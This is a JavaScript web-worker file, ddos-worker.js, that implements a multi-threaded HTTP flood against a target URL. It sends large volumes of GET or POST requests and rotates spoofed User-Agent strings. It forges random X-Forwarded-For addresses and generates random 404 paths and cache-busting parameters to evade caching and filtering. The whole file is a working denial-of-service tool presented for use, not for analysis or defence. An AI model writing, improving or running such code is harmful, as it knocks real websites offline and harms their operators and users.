// ddos-worker.js - DDoS Multi-thread Worker (Tối ưu tốc độ tối đa)

self.onmessage = function(e) {
    const { 
        url, method, threads, maxRequests, 
        attackMode, custom404Paths, randomPathLength 
    } = e.data;
    
    let count = 0;
    let completed = 0;
    let running = true;
    
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ];
    
    const headers = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    };

    function generate404Path() {
        let path = '';
        if (attackMode === '404' || attackMode === 'mixed') {
            if (custom404Paths && custom404Paths.trim()) {
                const paths = custom404Paths.split('\n').filter(p => p.trim());
                if (paths.length > 0) {
                    let base = paths[Math.floor(Math.random() * paths.length)].trim();
                    if (randomPathLength) {
                        const random = Math.random().toString(36).substring(2, 8);
                        base = base + '/' + random;
                    }
                    path = base;
                }
            } else {
                const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-';
                const length = Math.floor(Math.random() * 20) + 5;
                let randomPath = '';
                for (let i = 0; i < length; i++) {
                    randomPath += chars[Math.floor(Math.random() * chars.length)];
                }
                const depth = Math.floor(Math.random() * 3) + 1;
                let fullPath = '';
                for (let i = 0; i < depth; i++) {
                    const dirLen = Math.floor(Math.random() * 8) + 3;
                    let dir = '';
                    for (let j = 0; j < dirLen; j++) {
                        dir += chars[Math.floor(Math.random() * chars.length)];
                    }
                    fullPath += '/' + dir;
                }
                fullPath += '/' + randomPath;
                const exts = ['.php', '.html', '.js', '.css', '.jpg', '.png', '.pdf', '.zip', '.tar', '.gz', '.sql', '.log', '.txt', '.xml', '.json'];
                const ext = exts[Math.floor(Math.random() * exts.length)];
                path = fullPath + ext;
            }
            path += '?id=' + Math.random().toString(36).substring(2, 10);
            path += '&t=' + Date.now();
            path += '&r=' + Math.random().toString(36).substring(2, 8);
        }
        return path;
    }

    function sendRequest() {
        while (running && count < maxRequests) {
            count++;
            try {
                let targetUrl = url;
                if (attackMode === '404' || attackMode === 'mixed') {
                    targetUrl = url + generate404Path();
                } else {
                    targetUrl = url + '?r=' + Math.random().toString(36).substring(2, 8) + '&t=' + Date.now();
                }
                
                const ua = uas[Math.floor(Math.random() * uas.length)];
                const opts = {
                    method: method,
                    headers: { 
                        ...headers, 
                        'User-Agent': ua,
                        'X-Forwarded-For': Math.floor(Math.random() * 255) + '.' + 
                                           Math.floor(Math.random() * 255) + '.' + 
                                           Math.floor(Math.random() * 255) + '.' + 
                                           Math.floor(Math.random() * 255)
                    },
                    mode: 'no-cors',
                    cache: 'no-store',
                    redirect: 'follow',
                    referrerPolicy: 'no-referrer'
                };
                if (method === 'POST') {
                    opts.body = 'data=' + Math.random().toString(36).substring(2, 15) + '&t=' + Date.now();
                    opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
                fetch(targetUrl, opts).catch(() => {});
            } catch (e) {}
            
            if (count % 10 === 0) {
                self.postMessage({ type: 'progress', count: count });
            }
        }
        completed++;
        if (completed >= threads) {
            self.postMessage({ type: 'done', count: count });
            running = false;
        }
    }

    for (let i = 0; i < threads; i++) {
        setTimeout(() => sendRequest(), i * 0.01);
    }

    self.onmessage = function(msg) {
        if (msg.data === 'stop') {
            running = false;
            self.postMessage({ type: 'done', count: count });
        }
    };
};
